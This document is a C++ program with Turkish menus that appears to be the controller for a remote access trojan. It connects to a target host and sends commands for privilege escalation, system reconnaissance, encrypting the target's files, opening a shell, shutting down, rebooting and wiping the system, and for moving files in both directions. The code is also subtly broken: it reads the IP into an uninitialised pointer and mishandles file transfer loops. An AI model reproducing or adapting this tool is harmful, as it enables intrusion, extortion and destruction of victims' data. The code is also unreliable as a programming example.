#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <fstream>

void ana_menu() {
    std::cout << "Ana Menü:\n";
    std::cout << "1) Hedefe Bağlan\n";
    std::cout << "2) İnterneti Kontrol Et\n";
}

bool interneti_kontrol_et() {
    return system("ping -c 1 google.com") == 0;
}

void dosya_yukle(int soket) {
    std::string dosya_adi;
    std::cout << "Yüklemek istediğiniz dosyanın adını girin: ";
    std::cin >> dosya_adi;

    std::ifstream ifs(dosya_adi, std::ios::binary);
    if (!ifs) {
        std::cerr << "Dosya açılamadı.\n";
        return;
    }

    send(soket, dosya_adi.c_str(), dosya_adi.length(), 0);
    char buffer[1024];
    while (ifs.read(buffer, sizeof(buffer))) {
        send(soket, buffer, ifs.gcount(), 0);
    }
    ifs.close();
}

void dosya_indir(int soket) {
    std::string dosya_adi;
    std::cout << "İndirmek istediğiniz dosyanın adını girin: ";
    std::cin >> dosya_adi;
    send(soket, dosya_adi.c_str(), dosya_adi.length(), 0);

    std::ofstream ofs(dosya_adi, std::ios::binary);
    char buffer[1024];
    while (true) {
        int bytes_received = recv(soket, buffer, sizeof(buffer), 0);
        if (bytes_received <= 0) break;
        ofs.write(buffer, bytes_received);
    }
    ofs.close();
}

void hedefe_baglan() {
    int soket = socket(AF_INET, SOCK_STREAM, 0);
    if (soket == -1) {
        std::cerr << "Socket oluşturulamadı.\n";
        return;
    }

    const char* ip;
    int port;
    std::cout << "Dinleme Yapılacak IP: ";
    std::cin >> ip;
    std::cout << "Dinleme Yapılacak Port: ";
    std::cin >> port;

    struct sockaddr_in sunucu_adresi;
    sunucu_adresi.sin_family = AF_INET;
    sunucu_adresi.sin_port = htons(port);
    inet_pton(AF_INET, ip, &sunucu_adresi.sin_addr);

    if (connect(soket, (struct sockaddr*)&sunucu_adresi, sizeof(sunucu_adresi)) == -1) {
        std::cerr << "Bağlantı sağlanamadı.\n";
        close(soket);
        return;
    }

    std::cout << "Bağlantı Alınan IP: " << ip << "\n";
    std::cout << "Bağlantının Alındığı Port: " << port << "\n";

    while (true) {
        std::cout << "Yapılacak İşlemler:\n";
        std::cout << "1) Privilage Yükseltme\n";
        std::cout << "2) Sistem Bilgisi Toplama\n";
        std::cout << "3) Dosyaları Şifrele\n";
        std::cout << "4) Shelle Bağlan\n";
        std::cout << "5) Sistemi Kapat\n";
        std::cout << "6) Sistemi Yeniden Başla\n";
        std::cout << "7) Sistemi Formatla (Sistemdeki her şeyi sil)\n";
        std::cout << "8) Dosya Yükle\n";
        std::cout << "9) Dosya İndir\n";
        std::cout << "Seçiminizi yapın: ";

        int secim;
        std::cin >> secim;
        std::string komut;

        switch (secim) {
        case 1: komut = "yetki_yukselt"; break;
        case 2: komut = "sistem_bilgisi"; break;
        case 3: {
            std::string dosya;
            std::cout << "Hedef sistemdeki hangi dosyalar şifrelensin: ";
            std::cin >> dosya;
            komut = "sifrele:" + dosya;
            break;
        }
        case 4: komut = "shell"; break;
        case 5: komut = "sistem_kapat"; break;
        case 6: komut = "sistem_yeniden_baslat"; break;
        case 7: komut = "sistem_formatla"; break;
        case 8: komut = "dosya_yukle"; dosya_yukle(soket); continue;
        case 9: komut = "dosya_indir"; dosya_indir(soket); continue;
        default: std::cout << "Geçersiz seçim.\n"; continue;
        }

        send(soket, komut.c_str(), komut.length(), 0);
        char buffer[1024] = { 0 };
        int veri = recv(soket, buffer, sizeof(buffer), 0);
        if (veri > 0) {
            std::cout << "Sunucudan Gelen Mesaj:\n" << buffer << "\n";
        }
    }

    close(soket);
}

int main() {
    ana_menu();
    int secim;
    std::cin >> secim;

    switch (secim) {
    case 1: hedefe_baglan(); break;
    case 2:
        if (interneti_kontrol_et()) {
            std::cout << "İnternet bağlantısı mevcut.\n";
        }
        else {
            std::cout << "İnternet bağlantısı yok.\n";
        }
        break;
    default:
        std::cout << "Geçersiz seçim.\n";
        break;
    }
    return 0;
}
